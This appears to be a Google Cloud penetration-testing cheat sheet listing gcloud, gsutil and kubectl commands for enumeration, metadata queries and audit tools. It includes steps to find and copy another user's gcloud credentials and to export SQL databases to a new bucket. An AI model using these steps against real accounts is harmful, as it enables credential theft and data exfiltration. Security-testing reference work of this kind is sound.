# Cloud Pen-testing Part -5

````markdown
## Virtual Machines

List compute instances

```shell
gcloud compute instances list
````

Get shell access to an instance

```shell
gcloud beta compute ssh --zone "<region>" "<instance name>" --project "<project name>"
```

Puts public SSH key onto the metadata service for the project

```shell
gcloud compute ssh <local host>
```

Get access scopes if on an instance

```shell
curl http://metadata.google.internal/computeMetadata/v1/instance/serviceaccounts/default/scopes -H 'Metadata-Flavor:Google'
```

Use Google keyring to decrypt encrypted data

```shell
gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key <crypto-key> --keyring <crypto-keyring> --location global
```

### Storage Buckets

List Google Storage buckets

```shell
gsutil ls
```

List Google Storage buckets recursively

```shell
gsutil ls -r gs://<bucket name>
```

Copy an item from a bucket

```shell
gsutil cp gs://bucketid/item ~/
```

### Webapps & SQL

List WebApps

```shell
gcloud app instances list
```

List SQL instances

```shell
gcloud sql instances list
gcloud spanner instances list
gcloud bigtable instances list
```

List SQL databases

```shell
gcloud sql databases list --instance <instance ID>
gcloud spanner databases list --instance <instance name>
```

Export SQL databases and buckets

First copy buckets to a local directory

```shell
gsutil cp gs://bucket-name/folder/ .
```

Create a new storage bucket, change permissions, export SQL DB

```shell
gsutil mb gs://<googlestoragename>
gsutil acl ch -u <service account> gs://<googlestoragename>
gcloud sql export sql <sql instance name> gs://<googlestoragename>/sqldump.gz --database=<database name>
```

### Networking

List networks

```shell
gcloud compute networks list
```

List subnets

```shell
gcloud compute networks subnets list
```

List VPN tunnels

```shell
gcloud compute vpn-tunnels list
```

List Interconnects (VPN)

```shell
gcloud compute interconnects list
```

### Containers

```shell
gcloud container clusters list
```

GCP Kubernetes config file `~/.kube/config` gets generated when you are authenticated with gcloud and run:

```shell
gcloud container clusters get-credentials <cluster name> --region <region>
```

If successful and the user has the correct permission, the Kubernetes command below can be used to get cluster info:

```shell
kubectl cluster-info
```

### Serverless

GCP functions log analysis – May get useful information from logs associated with GCP functions

```shell
gcloud functions list
gcloud functions describe <function name>
gcloud functions logs read <function name> --limit <number of lines>
```

Gcloud stores credentials in `~/.config/gcloud/credentials.db`. Search home directories:

```shell
sudo find /home -name "credentials.db"
```

Copy gcloud dir to your own home directory to authenticate as the compromised user:

```shell
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list
```

### Other Useful Cloud Tools and Techniques

#### ScoutSuite

Multi-cloud security auditing tool

Install ScoutSuite

```shell
sudo apt-get install virtualenv
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
virtualenv –p python3 venv
source venv/bin/activate
pip install –r requirements.txt
```

To run as root

```shell
sudo apt-get install virtualenv
sudo su
virtualenv -p python3 venv
source venv/bin/activate
pip install scoutsuite
```

Scan AWS environment with ScoutSuite

```shell
python scout.py aws --profile=<aws profile name>
# or if installed...
scout aws --profile=<aws profile name>
```

#### Cloud\_Enum

Tool to search for public resources in AWS, Azure, and GCP

```shell
python3 cloud_enum.py -k <name-to-search>
```
